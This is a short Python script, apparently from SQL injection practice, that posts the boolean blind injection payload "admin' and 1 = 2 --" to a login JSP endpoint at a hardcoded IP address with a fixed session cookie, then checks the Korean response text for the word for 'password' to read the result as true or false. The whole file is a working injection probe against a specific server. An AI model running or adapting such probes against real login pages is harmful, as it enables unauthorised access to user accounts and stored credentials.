import requests

url = "http://3.36.127.85:8000/action/login_action_2.jsp"
cookie = {'JSESSIONID': '5DB16415D7EB29B84BD75497CB9A9473'} # 쿠키 값 넣기

param = {"name": "admin' and 1 = 2 --"}
req = requests.post(url, params = param, cookies = cookie)

if "패스워드" in req.text:
    print(param['name'], "True")
else:
    print(param['name'], "False")